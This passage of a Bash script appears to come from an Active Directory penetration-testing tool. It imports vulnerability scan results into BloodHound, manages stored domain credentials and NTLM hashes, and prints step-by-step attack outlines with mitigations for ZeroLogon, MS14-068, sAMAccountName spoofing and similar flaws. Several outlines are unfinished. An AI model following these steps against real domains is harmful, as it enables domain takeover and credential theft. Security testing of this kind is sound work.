            printf "%b\n    [*] For the computer = ${cn^^} at IP = $IP_vuln\n%b" "${YELLOW}" "${NC}"
            echo "MATCH (c) WHERE toUpper(c.distinguishedname)=\"${cn^^}\" SET c.\"$NAME_ATTRIBUTE\"_p\"$port\"=\"$isVulnerable\", c.IP=\"$IP_vuln\" RETURN c" | cypher-shell -u "$neo4j_username" -p "$neo4j_password"
            # echo "MATCH (c) WHERE toUpper(c.name)=\"${dnsHostName^^}\" SET c.\"$NAME_ATTRIBUTE\"-p\"$port\"=\"$isVulnerable\", c.IP=\"$IP_vuln\" RETURN c" | cypher-shell -u "$neo4j_username" -p "$neo4j_password"
        done
    done < <(cat $FILENAME | tr ',' ' ' | awk '{print $1, $2, $3}')
}

setting_bloodhound(){
    printf "%b\nEntering into [SETTING DATA IN BLOODHOUND] menu...%b" "${YELLOW}" "${NC}"
    if [ ! "$(ps aux | grep -c 'neo4j')" -gt 1 ]; then 
        printf "\n%bYou don't seem to have neo4j running...%b" "${RED}" "${NC}"
        printf "%b\nReturning to the menu...\n%b" "${YELLOW}" "${NC}"
        return
    fi
    printf "\nWhat is your Neo4j username?"
    printf "\nEnter the username: "
    read -r neo4j_username 
    printf "\nWhat is your Neo4j password?"
    printf "\nEnter the password: "
    read -r neo4j_password
    ad_user_name="";
    ad_user_pwd=""
    ad_user_hash=""
    domain_name=""
    fqdn=""
    tld=""
    if [[ -n "$( tail -n +2 "$PATH_TO_WORKSPACE/known-data/accounts/domain-infos_list.txt")" ]]; then
        printf "\nChoose among the following domains:\n"
        readarray -t list_domains < <(tail -n +2 "$PATH_TO_WORKSPACE/known-data/accounts/domain-infos_list.txt")
        select domain in "${list_domains[@]}" Quit
        do
            printf "\nSelected item #%s. We will scan the domain: %s\n" "$REPLY" "$domain";domain_name=$(echo "$domain" | cut -d "," -f2 ) && fqdn=$(echo "$domain" | cut -d "," -f1);break;
        done
        if [ -z "$domain_name" ]; then
            printf "%bYou should have specified the domain name into the file: domain-infos_list.txt%b" "${RED}" "${NC}"
            printf "%b\nReturning to the menu...\n%b" "${YELLOW}" "${NC}"
            return
        fi
    else
        printf "%b\nNo domain specified into the file: domain-infos_list.txt.%b" "${RED}" "${NC}"
        printf "%b\nReturning to the menu...\n%b" "${YELLOW}" "${NC}"
        return
    fi

    if [[ -n "$( tail -n +2 "$PATH_TO_WORKSPACE/known-data/accounts/dom-users_list.txt")" ]]; then
        printf "\nChoose among the following users:\n"
        readarray -t list_users < <(tail -n +2 "$PATH_TO_WORKSPACE/known-data/accounts/dom-users_list.txt")
        select user in "${list_users[@]}" Quit
        do
            printf "\nSelected item #%s. We will use the user: %s\n" "$REPLY" "$user";ad_user_name=$(echo "$user" | cut -d "," -f2) && ad_user_pwd=$(echo "$user" | cut -d "," -f3) && ad_user_hash=$(echo "$user" | cut -d "," -f4);break;
        done
        if [ -z "$ad_user_name" ]; then
            printf "%bYou should have selected an user from the file: dom-users_list.txt%b" "${RED}" "${NC}"
            printf "%b\nReturning to the menu...\n%b" "${YELLOW}" "${NC}"
            return
        fi
    else
        printf "%b\nNo user specified into the file: dom-users_list.txt.%b" "${RED}" "${NC}"
        printf "%b\nReturning to the menu...\n%b" "${YELLOW}" "${NC}"
        return
    fi

    if [[ -n "$( tail -n +2 "$PATH_TO_WORKSPACE/known-data/accounts/domain-controllers_list.txt")" ]]; then
        printf "\nChoose among the following DCs:\n"
        readarray -t list_dcs < <(tail -n +2 "$PATH_TO_WORKSPACE/known-data/accounts/domain-controllers_list.txt")
        select dc in "${list_dcs[@]}" Quit
        do
            printf "\nSelected item #%s. We will use the user: %s\n" "$REPLY" "$dc";dc_name=$(echo "$dc" | cut -d "," -f1) && dc_ip=$(echo "$dc" | cut -d "," -f2);break;
        done
        if [ -z "$dc_ip" ]; then 
            printf "%bYou should have selected a domain controller from the file: domain-controllers_list.txt%b" "${RED}" "${NC}"
            printf "%b\nReturning to the menu...\n%b" "${YELLOW}" "${NC}"
            return
        fi
    else
        printf "%b\nNo domain controller specified into the file: domain-controllers_list.txt.%b" "${RED}" "${NC}"
        printf "%b\nReturning to the menu...\n%b" "${YELLOW}" "${NC}"
    fi
    cd "$PATH_TO_WORKSPACE/known-data/accounts/results_ldap" || exit
    python3 "$PATH_TO_WORKSPACE/SCANNER_AD/windapsearch.py" --dc-ip "$dc_ip" -u "$ad_user_name"@"$fqdn" -p "$ad_user_pwd" --computers -r -C -o "$PATH_TO_WORKSPACE/known-data/accounts/results_ldap"
    cd "$PATH_TO_WORKSPACE" || exit
    if [ -n "$(cat "$PATH_TO_WORKSPACE/known-data/accounts/computers_list.csv")" ]; then 
        printf "\n%bA problem must have occured during the request of computers list (for retrieving their IP), you should re-run the scan or write th computers list into known-data/accounts/computers_list.csv...%b" "${RED}" "${NC}"
        printf "%b\nReturning to the menu...\n%b" "${YELLOW}" "${NC}"
        return
    else
        # Import SMBGhost
        import_data_bloodhound "$PATH_TO_WORKSPACE/known-data/vulns/cve-smbghost_vulns-ip" "isVulnerableToSMBGhost" "$neo4j_username" "$neo4j_password"
        # Import SMBleed
        import_data_bloodhound "$PATH_TO_WORKSPACE/known-data/vulns/cve-smbleed_vulns-ip" "isVulnerableToSMBleed" "$neo4j_username" "$neo4j_password"
        # Import Eternal Blue w/o account
        import_data_bloodhound "$PATH_TO_WORKSPACE/known-data/vulns/ms17-010-eternalblue-wa_vulns-ip" "isVulnerableToEternalBlue" "$neo4j_username" "$neo4j_password"
        # Import Eternal Blue
        import_data_bloodhound "$PATH_TO_WORKSPACE/known-data/vulns/ms17-010-eternalblue_vulns-ip" "isVulnerableToEternalBlue" "$neo4j_username" "$neo4j_password"
        # Import NetApi 
        import_data_bloodhound "$PATH_TO_WORKSPACE/known-data/vulns/ms08-67_vulns-ip" "isVulnerableToNetapi" "$neo4j_username" "$neo4j_password"
        # Import SMB Signing
        import_data_bloodhound "$PATH_TO_WORKSPACE/known-data/vulns/smb_signing_disabled" "isSMBSigningEnabled" "$neo4j_username" "$neo4j_password"
        # Import PetitPotam with null session
        import_data_bloodhound "$PATH_TO_WORKSPACE/known-data/vulns/petitpotam-nullsession_vulns-ip" "isVulnerableToNSPetitPotam" "$neo4j_username" "$neo4j_password"
        # Import PetitPotam
        import_data_bloodhound "$PATH_TO_WORKSPACE/known-data/vulns/petitpotam_vulns-ip" "isVulnerableToPetitPotam" "$neo4j_username" "$neo4j_password"
        # Import PrinterBug
        import_data_bloodhound "$PATH_TO_WORKSPACE/known-data/vulns/printerbug_vulns-ip" "isVulnerableToPrinterBug" "$neo4j_username" "$neo4j_password"
        # Import Kerberos Checksum
        import_data_bloodhound "$PATH_TO_WORKSPACE/known-data/vulns/ms14-068-kerberos_vulns-ip" "isVulnerableToKerberosChecksum" "$neo4j_username" "$neo4j_password"
        # Import ZeroLogon
        import_data_bloodhound "$PATH_TO_WORKSPACE/known-data/vulns/cve-zerologon_vulns-ip" "isVulnerableToZeroLogon" "$neo4j_username" "$neo4j_password"
        # Import GPP Abuse without acount
        import_data_bloodhound "$PATH_TO_WORKSPACE/known-data/vulns/gppabuse-wa_vulns-ip" "isVulnerableToNSGPPAbuse" "$neo4j_username" "$neo4j_password"
        # Import GPP Abuse
        import_data_bloodhound "$PATH_TO_WORKSPACE/known-data/vulns/gppabuse_vulns-ip" "isVulnerableToGPPAbuse" "$neo4j_username" "$neo4j_password"
        # Import BlueGate
        import_data_bloodhound "$PATH_TO_WORKSPACE/known-data/vulns/cve-bluegate_vulns-ip" "isVulnerableToBlueGate" "$neo4j_username" "$neo4j_password"
        # Import PrintNightmare
        import_data_bloodhound "$PATH_TO_WORKSPACE/known-data/vulns/cve-printnightmare_vulns-ip" "isVulnerableToPrintNightmare" "$neo4j_username" "$neo4j_password"
        # Import MIC Remove attack
        import_data_bloodhound "$PATH_TO_WORKSPACE/known-data/vulns/micRA_vulns-ip" "isVulnerableToMICRemove" "$neo4j_username" "$neo4j_password"
        # Import sAMAccountNAme Spoofing
        import_data_bloodhound "$PATH_TO_WORKSPACE/known-data/vulns/cve-sAMAccountNameSpoofing_vulns-ip" "isVulnerableToSAMAccountNameSpoofing" "$neo4j_username" "$neo4j_password"
    fi
}

#######################################################
# => SECTION DEFAULT FUNCTIONS
#######################################################

modify_infos_aio(){
    FILENAME=$1
    target_name=$2
    action=$3
	if [ ! -f "$FILENAME" ]; then
		printf "The file doesn't exist."
		return
	fi
	if [[ -n $(tail -n +2 "$FILENAME") ]]; then
        printf "\n${BLUE}The current list of %s are: ${NC}" "$target_name"
        printf "\n%s\n"  "$(tail -n +2 "$FILENAME")"
    else
        printf "No %s saved into the file for now." "$target_name"
    fi
	if [[ "$action" == "ADD" ]]; then
		printf "\n\n%bTo add a %s, you must conform to the following format:%b" "${BLUE}" "$target_name" "${NC}"
		printf "\n%s\n\n"  "$(awk '(NR==1)' "$FILENAME")"

		IFS="," 
		read -r fields < <(awk '(NR==1)' "$FILENAME")
		INDEX=1
		count_columns=$(echo "$fields" | tr -d -c ',' | wc -m)
		for column in $fields; do
			printf "Enter the %s value: " "$column"
			read -r $column
            if (( "$INDEX" == 1 )); then
                printf '\n%s,' "${!column}" >> "$FILENAME"; 
            elif (( "$INDEX" == $(("$count_columns"+1)) )); then
                printf "%s" "${!column}" >> "$FILENAME" 
            else
                printf '%s,' "${!column}" >> "$FILENAME"; 
			fi
			((INDEX++))
		done
		printf "%bThe %s has been added.%b\n" "${BLUE}" "$target_name" "${NC}"

	elif [[ "$action" == "DELETE" ]]; then
		readarray -t list_targets < <(tail -n +2 "$FILENAME")
		select target in "${list_targets[@]}"
		do
			printf "\nSelected item #%s. We will remove %s\n" "$REPLY" "$target"
			sed -i $(("$REPLY"+1))d "$FILENAME"
			printf "%bThe $target_name has been deleted.%b\n" "${BLUE}" "${NC}"
			break
		done
	fi
    printf "%b\n\n=> The files are saved into known-data/accounts\n%b" "${BLUE}" "${NC}"
}



add_infos() {
    while true; do 
        PS3="Select actions to carry out: "
        choices_action=(
            "Option 1: Add informations"
            "Option 2: Remove informations"
            "Option 3: Return to the main menu"
        )
        while true; do
            printf "%b\nEntering into [MODIFYING INFORMATION] menu...%b" "${YELLOW}" "${NC}"
            printf "%b\n=> Menu%b\n" "${UNDERLINE}" "${NC}"
            select choice_action in "${choices_action[@]}"
            do
                printf "\nSelected item #%s. We will %s\n\n" "$REPLY" "$choice_action";break;
            done
            if [[ "$REPLY" == "1" ]]; then 
                option_action="ADD" 
            elif [[ "$REPLY" == "2" ]]; then 
                option_action="DELETE"
            elif [[ "$REPLY" == "3" ]]; then
                return
            fi
            printf "%b\nEntering into [%b INFORMATION] menu...%b\n" "${YELLOW}" "$option_action" "${NC}"
            addinfos_menu_options=(
                "Option 1: $option_action a local user"
                "Option 2: $option_action a local administrator user"
                "Option 3: $option_action a domain user"
                "Option 4: $option_action domain infos"
                "Option 5: $option_action a Domain Controller (DC) ip and name"
                "Option 6: Return to the previous menu"
                "Option 7: Return to the main menu"
            )
            select item_add in "${addinfos_menu_options[@]}"
            do
                printf "\nSelected item #%s. We will %s\n" "$REPLY" "$item_add";break;
            done
            if [[ "$REPLY" == "1" ]]; then
                modify_infos_aio "$PATH_TO_WORKSPACE/known-data/accounts/local-users_list.txt" "local user" "$option_action"
            elif [[ "$REPLY" == "2" ]]; then
                modify_infos_aio "$PATH_TO_WORKSPACE/known-data/accounts/local-adm-users_list.txt" "local administrator user" "$option_action"
            elif [[ "$REPLY" == "3" ]]; then
                modify_infos_aio "$PATH_TO_WORKSPACE/known-data/accounts/dom-users_list.txt" "domain user" "$option_action"
            elif [[ "$REPLY" == "4" ]]; then
                modify_infos_aio "$PATH_TO_WORKSPACE/known-data/accounts/domain-infos_list.txt" "domain infos" "$option_action"
            elif [[ "$REPLY" == "5" ]]; then
                modify_infos_aio "$PATH_TO_WORKSPACE/known-data/accounts/domain-controllers_list.txt" "Domain Controllers (DCs)" "$option_action"
            elif [[ "$REPLY" == "6" ]]; then
                printf "%b\nReturning to the previous menu...\n%b" "${YELLOW}" "${NC}"
                break
            elif [[ "$REPLY" == "7" ]]; then
                printf "%b\nReturning to the menu...\n%b" "${YELLOW}" "${NC}"
                return
            fi
        done
    done
}

get_ip_addr(){
    readarray -t ip_addrs < <(ifconfig|grep 'inet '|awk '{print $2}' | tr "\n" "\|")
    printf "\nChoose among the following IP addresses or select 'Quit'\n"
    select ip_addr in "${ip_addrs[@]}" Quit
    do
        printf "\nSelected item #%s. We will use the chosen IP for listening : %s\n" "$REPLY" "$ip_addr";
        if [[ "$ip_addr" == "Quit" ]]; then
            break
        fi
        return "$ip_addr"
    done
}

#######################################################
# => SECTION INFORMATION
#######################################################
show_details_attacks(){
    while true; do
        list_attacks_options=(
            "Option 01: Show details about SMBGhost attack"
            "Option 02: Show details about SMBleed attack"
            "Option 03: Show details about Eternal Blue (or MS17-010) attack"
            "Option 04: Show details about MS08-067"
            "Option 05: Show details about PetitPotam"
            "Option 06: Show details about SMB Signing attack"
            "Option 07: Show details about PrinterBug (or SpoolSample) attack"
            "Option 08: Show details about MS14-068 (Kerberos Checksum attack) attack"
            "Option 09: Show details about ZeroLogon attack"
            "Option 10: Show details about GPP abuse attack"
            "Option 11: Show details about BlueGate attack"
            "Option 12: Show details about PrintNightmare attack"
            "Option 13: Show details about MIC Remove (or Drop The Mic) attack"
            "Option 14: Show details about sAMAccountName spoofing attack"
            "Option 15: Show details about SMB Pipes attacks"
            "Option 16: Return to the main menu"
        )
        printf "%b\nEntering into [SHOW DETAILS PER ATTACK] menu...%b" "${YELLOW}" "${NC}"
        printf "%b\n=> Menu%b\n" "${UNDERLINE}" "${NC}"
        select attack in "${list_attacks_options[@]}"
        do
            printf "\nSelected action #%s. We will %s\n\n" "$REPLY" "$attack";break;
        done
        if [[ "$action" == "Quit" ]]; then
            return
        fi
        # SMBGhost
        if [[ "$REPLY" == "1" ]]; then
            printf "%b%b\nSMBGhost (or CVE-2020-0796)%b\n" "${YELLOW}" "${BOLD}" "${NC}"
            printf "\33[4mSMBGhost attack description:\033[0m It exploits the way SMB protocol handles the decompresison of client-supplied data (quite similar to SMBleed).\n \
    \33[4mTarget(s):\033[0m Vulnerable Windows versions with the patches not applied\n \
    \33[4mRisky:\033[0m ?\n \
    \33[4mExploit steps:\033[0m\n \
        to do: \n \
        # 1) Find the offset depending on the Windows version targeted. It is where the payload will be injected. \n \
        # 2) Overriding OriginalCompressedSegmentSize or Offset field  \n \
    \33[4mMitigations:\033[0m\n \
        - Apply the security patches (ex: KB4560960, KB4557957)\n \
        - Disable SMBv3 Server compression feature\n \
\33[4mLinks:\033[0m\n \
    - https://blog.zecops.com/research/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/\n"
        
        # SMBleed
        elif [[ "$REPLY" == "2" ]]; then
            printf "%b%b\nSMBleed (or CVE-2020-1206)%b\n" "${YELLOW}" "${BOLD}" "${NC}"
            printf "\33[4mSMBleed attack description:\033[0m It exploits the way SMB protocol handles the decompresison of client-supplied data (quite similar to SMBGhost).\n \
    \33[4mTarget(s):\033[0m Vulnerable Windows versions with the patches not applied\n \
    \33[4mRisky:\033[0m ?\n \
    \33[4mExploit steps:\033[0m\n \
        to do: \n\
        # 1) Find the offset depending on the Windows version targeted. It is where the payload will be injected. \n \
        # 2) Overriding OriginalCompressedSegmentSize or Offset field  \n \
    \33[4mMitigations:\033[0m\n \
        - Apply the security patches (ex: KB4560960, KB4557957)\n \
        - Disable SMBv3 Server compression feature\n \
\33[4mLinks:\033[0m\n \
    - https://blog.zecops.com/research/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/\n"
        
        # Eternal Blue (or MS17-010)
        elif [[ "$REPLY" == "3" ]]; then
            printf "%b%b\nEternalBlue (or MS17-010)%b\n" "${YELLOW}" "${BOLD}" "${NC}"
            printf "\33[4mEternalBlue attack description:\033[0m The attack exploits how Microsoft Windows handles the crafted packets, it only requires to send a maliciously-crafted packet to the target server, then the malware will propagate.\n \
    \33[4mTarget(s):\033[0m Workstations with SMBv1 enabled (and not the patch applied), most cases are the Windows Server 2008 and 2012 R2\n \
    \33[4mRisky:\033[0m Could crash the workstations\n \
    \33[4mExploit steps:\033[0m\n \
        1) Create a buffer overflow into protocol communication for casting OS/2 File Extended Attribute (FEA)\n \
        2) Trigger the buffer overflow \n \
        2) to do \n \
    \33[4mMitigations:\033[0m \n \
        - Apply the security patch MS17-010.\n"
        
        # Netapi (or MS08-067) 
        elif [[ "$REPLY" == "4" ]]; then
            printf "%b%b\nNetapi (or MS08-067)%b\n" "${YELLOW}" "${BOLD}" "${NC}"
            printf "\33[4mNetapi attack description:\033[0m Over the RPC protocol, an attacker can trigger a buffler overflow to gain access to the system. \n \
    \33[4mTarget(s):\033[0m Workstations (most cases are: Windows 2000, Windows XP, Windows Server 2003)\n \
    \33[4mRisky:\033[0m Could crash the workstations - very risky\n \
    \33[4mExploit steps:\033[0m\n \
        1) Return to the 64-bit address for 2nd gadge \n \
        2) Prepare RAX for next call, RCX for stack pivot and RDX for final call \n \
        3) Dereference pivot destination pointed to by RCX and call RDX \n \
        4) Final Stack Pivot \n \
    \33[4mMitigations:\033[0m Apply the security patch MS08-067.\n \
\33[4mLinks:\033[0m\n \
    - https://www.f-secure.com/content/dam/labs/docs/hello-ms08-067-my-old-friend.pdf\n"
        
        # PetitPotam
        elif [[ "$REPLY" == "5" ]]; then
            printf "%b%b\nPetitPotam attack%b\n" "${YELLOW}" "${BOLD}" "${NC}"
            printf "\33[4mPetitPotam attack description:\033[0m It is an NTLM Relay attack forcing a targeted user to make a connection to a compromised system and then relaying the requests to the service to be attacked. It allows the attacker to gain an elevation of privilege on behalf of another user by solving the challenge-response problem.\n \
    \33[4mTarget(s):\033[0m Domain controllers (and specifically the share: SYSVOL)\n \
    \33[4mRisky:\033[0m Not\n \
    \33[4mExploit steps:\033[0m\n \
        1) Abuse Microsoft's Encrypting File System Remote Protocol (MS-EFSRPC) to force a Windows host to authenticate to another \n \
        # to do \n \
    \33[4mMitigations:\033[0m\n \
            - Check recommandations of the KB5005413 \n"

        # SMB Signing
        elif [[ "$REPLY" == "6" ]]; then
            printf "%b%b\nSMB Signing defect%b\n" "${YELLOW}" "${BOLD}" "${NC}"
            printf "\33[4mSMB Signing defect description:\033[0m SMB signing (also known as security signatures) is a security mechanism in the SMB protocol. SMB signing means that every SMB message contains a signature that is generated by using the session key. It proves the authenticity of the sender.\n \
    \33[4mTarget(s):\033[0m Computers with SMB Signing = False\n \
    \33[4mRisky:\033[0m Not\n \
    \33[4mExploit steps:\033[0m\n \
        1) Request an IP and check its SMB Signing status \n \
    \33[4mMitigations:\033[0m\n \
        - Set SMB Signing to True.\n"

        # PrinterBug
        elif [[ "$REPLY" == "7" ]]; then
            printf "%b%b\nPrinterBug attack%b\n" "${YELLOW}" "${BOLD}" "${NC}"
            printf "\33[4mPrinterBug attack description:\033[0m An attacker can trigger the spooler service of a target host via a RPC call and make it auhtneiticate to a target of the attacker's choosing.\n \
    \33[4mTarget(s):\033[0m Windows host with the spooler enabled: spoolsv.exe\n \
    \33[4mRisky:\033[0m ?\n \
    \33[4mExploit steps:\033[0m\n \
        1) Check if the spooler is available \n \
        2) Abuse the defect (ex: via Printerbug or spoolsample tools) \n \
\33[4mLinks:\033[0m\n \
    - https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-rprn\n"

        # Kerberos Checksum (MS14-068)
        elif [[ "$REPLY" == "8" ]]; then
            printf "%b%b\nKerberos Checksum (or MS14-068)%b\n" "${YELLOW}" "${BOLD}" "${NC}"
            printf "\33[4mKerberos Checksum attack (or MS14-068) description:\033[0m The vulnerability enables an attacker to modify an existing, valid, domain user logon token (Kerberos Ticket Granting Ticket, TGT, ticket) by adding the false statement that the user is a member of Domain Admins (or other sensitive group) and the Domain Controller (DC) will validate that (false) claim enabling attacker improper access to any domain (in the AD forest) resource on the network. This is all done without changing the members of existing AD groups.\n \
    \33[4mTarget(s):\033[0m Vulnerable Domain Controllers \n \
    \33[4mRisky:\033[0m ?\n \
    \33[4mExploit steps:\033[0m\n \
        1) Request a TGT without a PAC by sending an AS-REQ with PA-PAC-REQUEST set to false.  \n \
        2) Forge a PAC claiming membership of domain administrators. ‘Sign’ it using plain MD5. \n \
        3) Create a TGS-REQ message with krbtgt as the target. The TGT from the first step is used along with the fake PAC encrypted with a sub-session key. \n \
        4) Send this to a vulnerable domain controller. \n \
\33[4mLinks:\033[0m\n \
    - https://adsecurity.org/?p=541 \n \
    - https://labs.withsecure.com/publications/digging-into-ms14-068-exploitation-and-defence\n"


        # ZeroLogon
        elif [[ "$REPLY" == "9" ]]; then
            printf "%b%b\nZeroLogon (or CVE-2020-1472)%b\n" "${YELLOW}" "${BOLD}" "${NC}"
            printf "\33[4mZeroLogon description:\033[0m It is a vulnerability in Microsoft's Netlogon process cryptography that allows an attack against Microsoft Active Directory domain controllers and then to impersonate any computer, including the root domain controller. \n \
    \33[4mTarget(s):\033[0m Domain controllers\n \
    \33[4mRisky:\033[0m Could break things such as DNS functionality, communication with replication Domain Controllers, etc.\n \
    \33[4mExploit steps:\033[0m\n \
        1) Establish an unsecure Netlogon channel against a domain controller by performing a brute-force attack using an 8 zero-bytes challenge and ciphertext, while spoofing the identity of that same domain controller. This would require an average of 256 attempts (given the probability of success being 1 in 256). \n \
        2) Use the NetrServerPasswordSet2 call to set the domain controller account’s password, as stored in Active Directory, to an empty one. This breaks some of the domain controller functionality, since the password stored in the domain controller’s registry does not change (this is the reason step four noted below is taken). \n \
        3) Use the empty password to connect to that same domain controller and dump additional hashes using the Domain Replication Service (DRS) protocol. \n \
        4) Revert the domain controller password to the original one as stored in the local registry to avoid detection. \n \
        5) Use the hashes dumped from stage 3 to perform any desired attack such as Golden Ticket or pass the hash using domain administrator credentials. \n \
    \33[4mMitigations:\033[0m\n \
        - Microsoft strongly recommends to all customers for installing the February 2021 updates to be fully protected from Zerologon Vulnerability. \n \
\33[4mLinks:\033[0m\n \
    - https://www.crowdstrike.com/blog/cve-2020-1472-zerologon-security-advisory/ \n"

        # GPP Abuse
        elif [[ "$REPLY" == "10" ]]; then
            printf "%b%b\nGPP Abuse%b\n" "${YELLOW}" "${BOLD}" "${NC}"
            printf "\33[4mGPP Abuse attack description:\033[0m Before a security patch release, the credentials were stored in cleartext into the GPPs, so it was possible to retrieve and decrypt them.\n \
    \33[4mTarget(s):\033[0m Group Policy Preferences (GPP) stored into the share: SYSVOL of the Domain Controllers\n \
    \33[4mRisky:\033[0m Not risky at all\n \
    \33[4mExploit steps:\033[0m\n \
        1) Check the right to read files onto the SYSVOL share \n \
        2) If that's the case, search for credentials (for the strings cpassword and clogin) \n \
        3) Decrypt the password with gpp-decrypt <hash> \n \
    \33[4mMitigations:\033[0m\n \
        - Delete the existing GPP xml files containing credentials\n \
        - Install the security patch (KB2962486) to prevent the adding of new credentials\n \
\33[4mLinks:\033[0m\n \
    - https://infosecwriteups.com/attacking-gpp-group-policy-preferences-credentials-active-directory-pentesting-16d9a65fa01a \n"

        # BlueGate
        elif [[ "$REPLY" == "11" ]]; then
            printf "%b%b\nBlueGate (or CVE-2020-0610)%b\n" "${YELLOW}" "${BOLD}" "${NC}"
            printf "\33[4mBlueGate attack description:\033[0m An unauthenticated attacker connects to the target system using RDP and sends specially crafted requests, aka 'Windows Remote Desktop Gateway (RD Gateway) Remote Code Execution Vulnerability'. \n \
    \33[4mTarget(s):\033[0m Windows Remote Desktop Gateway (RD Gateway) protocol\n \
    \33[4mRisky:\033[0m ?\n \
    \33[4mExploit steps:\033[0m\n \
        1) to do \n"

        # PrintNightmare
        elif [[ "$REPLY" == "12" ]]; then
            printf "%b%b\nPrintNightmare (or CVE-2021-1675)%b\n" "${YELLOW}" "${BOLD}" "${NC}"
            printf "\33[4mPrintNightmare attack description:\033[0m It is a vulnerability that leverage the spooler service by adding a printer with a providing driver (which whill be a malicious file) that will be executed via the spooler service to gain an elevation of privilege.\n \
    \33[4mTarget(s):\033[0m Workstations with the spooler service enabled\n \
    \33[4mRisky:\033[0m It could stop the spooler service if the DLL is not deleted after (and re-enable the original)\n \
    \33[4mExploit steps:\033[0m\n \
        1) Check for workstations with the spooler service enabled and rights onto them \n \
        2) Create the malicious DLL (which is the driver) \n \
        3) Download it as a driver on and execute it\n"

        # Remove MIC (or Drop The Mic)
        elif [[ "$REPLY" == "13" ]]; then
            printf "%b%b\nRemove MIC aka Drop The Mic (or CVE-2019-1040)%b\n" "${YELLOW}" "${BOLD}" "${NC}"
            printf "\33[4mMIC Remove attack description:\033[0m It is \n \
    \33[4mTarget(s):\033[0m Domain controllers (and specifically the share: SYSVOL)\n \
    \33[4mRisky:\033[0m ?\n \
    \33[4mExploit steps:\033[0m\n \
        1) Unset the signing flags in the NTLM_NEGOTIATE message (NTLMSSP_NEGOTIATE_ALWAYS_SIGN, NTLMSSP_NEGOTIATE_SIGN) \n \
        2) Inject a rogue msvAvFlag field in the NTLM_CHALLENGE message with a value of zeros \n \
        3) Remove the MIC from the NTLM_AUTHENTICATE message \n \
        4) Unset the following flags in the NTLM_AUTHENTICATE message: NTLMSSP_NEGOTIATE_ALWAYS_SIGN, NTLMSSP_NEGOTIATE_SIGN, NEGOTIATE_KEY_EXCHANGE, NEGOTIATE_VERSION. \n \
\33[4mLinks:\033[0m\n \
    - https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/ \n \
    - https://www.crowdstrike.com/blog/active-directory-ntlm-attack-security-advisory/ \n"

        # sAMAccountName spoofing
        elif [[ "$REPLY" == "14" ]]; then
            printf "%b%b\nsAMAccountName Spoofing (or CVE-2021-4227)%b\n" "${YELLOW}" "${BOLD}" "${NC}"
            printf "\33[4msAMAccountName spoofing attack description:\033[0m A lack of validation of the sAMAccountName attribute allows attackers to impersonate domain controller accounts due to the creation of an account and the modification of its attribute.\n \
    \33[4mTarget(s):\033[0m No risky, just make sure to delete the created account after the compromission\n \
    \33[4mRisky:\033[0m ?\n \
    \33[4mExploit steps:\033[0m\n \
        1) Check if the user whose you possess the credentials has the right to create a machine \n \
        2) If that's the case, create a machine account. \n \
        3) Clear the 'servicePrincipalName' attribute \n \
        4) Modify the 'sAMAccountName' attribute of the machine account to point the domain controller name without the $ sign \n \
        5) Request a TGT for the domain controller account \n \
        6) Restore the 'sAMAccountName' attribute to its original value or any other value \n \
        7) Request a service ticket using the S4U2self method  \n \
        8) Receive a service ticket on behalf of a domain admin account \n \
    \33[4mMitigations:\033[0m\n \
        - Set the machineAccountQuota to 0 \n \
        - Apply the security patches (KB5008380 and KB5008202) to the domain controllers \n \
\33[4mLinks:\033[0m\n \
    - https://pentestlab.blog/2022/01/10/domain-escalation-samaccountname-spoofing/ \n"

        # SMB Pipes attack
        elif [[ "$REPLY" == "15" ]]; then
            printf "%b%b\nSMB Pipes attack aka Coerce%b\n" "${YELLOW}" "${BOLD}" "${NC}"
            printf "\33[4mSMB Pipes attack description:\033[0m \n \
    \33[4mTarget(s):\033[0m to do\n \
    \33[4mRisky:\033[0m ?\n \
    \33[4mExploit steps:\033[0m\n \
        1) to do \n \
        2) ... \n"
            
        # Return to the menu
        elif [[ "$REPLY" == "16" ]]; then
            printf "%b\nReturning to the menu...\n%b" "${YELLOW}" "${NC}"
            return
        fi
    done
}

#######################################################
# => SECTION ENVIRONMENT CREATION
#######################################################
creation_environment(){
    cd "$PATH_TO_WORKSPACE" || exit
    # Creation of the folders with the known data about network and accounts (ex: list of IP with SMB open, domain accounts, etc.)
    if [ ! -d "$PATH_TO_WORKSPACE/known-data" ]; then
        printf "%b\nCreation of the environment...\n%b" "${GREEN}" "${NC}"
        mkdir "$PATH_TO_WORKSPACE/known-data"
        mkdir "$PATH_TO_WORKSPACE/known-data/network"
        mkdir "$PATH_TO_WORKSPACE/known-data/accounts"
        mkdir "$PATH_TO_WORKSPACE/known-data/accounts/results_ldap"
        # example for dom-users: user,password,aa3befefefef:FEFEFEF
        echo "domain,username,password,NTLM_hash" > "$PATH_TO_WORKSPACE/known-data/accounts/dom-users_list.txt"
        # example for local users: user-local,password,aa3befefefef:FEFEFEF
        echo "username,password,NTLM_hash" > "$PATH_TO_WORKSPACE/known-data/accounts/local-users_list.txt"
        # example for local admin users: admin-local,password,aa3befefefef:FEFEFEF
        echo "username,password,NTLM_hash" > "$PATH_TO_WORKSPACE/known-data/accounts/local-adm-users_list.txt"
        # example for dc: dc01-enterprise,192.168.0.1
        echo "domain_controller_hostname,domain_controller_ip" > "$PATH_TO_WORKSPACE/known-data/accounts/domain-controllers_list.txt"
        # example for domains: enterprise.local,enterprise,local
        echo "fqdn,domain,tld" > "$PATH_TO_WORKSPACE/known-data/accounts/domain-infos_list.txt"
        mkdir "$PATH_TO_WORKSPACE/known-data/vulns"
        mkdir "$PATH_TO_WORKSPACE/known-data/exploits"
    fi
}

quitting_cvad(){
    for pid in $(ps -T|awk '(NR>1) {print $1}'); do 
        kill "$pid"
    done
}


#######################################################
# => SECTION MAIN MENU
# links for banner: https://manytools.org/hacker-tools/ascii-banner/
#######################################################
printf '
 ______   ______ _______ _______ _     _ _______ ______  _______ __   __
 |_____] |_____/ |______ |_____| |____/  |_____| |     \ |_____|   \_/  
 |_____] |    \_ |______ |     | |    \_ |     | |_____/ |     |    |   
                                                                        '
printf '\nby \n%b@MizaruIT on Twitter: wwW.twitter.com/MizaruIT' "${BLUE}" 
printf '\n%b@MizaruIT on GitHub: www.github.com/MizaruIT%b\n' "${BLUE}" "${NC}"



# SECTION: creation of the environment
PATH_TO_WORKSPACE=$(pwd)
cd "$PATH_TO_WORKSPACE" || exit
creation_environment

while true; do
    PS3="Select actions to carry out: "
    items=(
